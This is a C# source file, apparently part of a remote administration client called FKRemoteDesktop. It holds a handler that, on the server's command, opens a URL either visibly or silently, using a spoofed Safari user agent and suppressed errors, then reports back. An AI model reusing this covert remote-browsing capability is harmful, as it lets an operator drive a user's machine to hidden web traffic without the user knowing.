using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Message.SubMessages;
using System;
using System.Diagnostics;
using System.Net;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class WebsiteVisitorHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoVisitWebsite;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoVisitWebsite msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoVisitWebsite");
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoVisitWebsite message)
        {
            string url = message.Url;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!message.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        {
                        }
                    }
                    catch
                    {
                    }
                }

                client.Send(new SetStatus { Message = "客户端已访问网站: " + url });
            }
        }
    }
}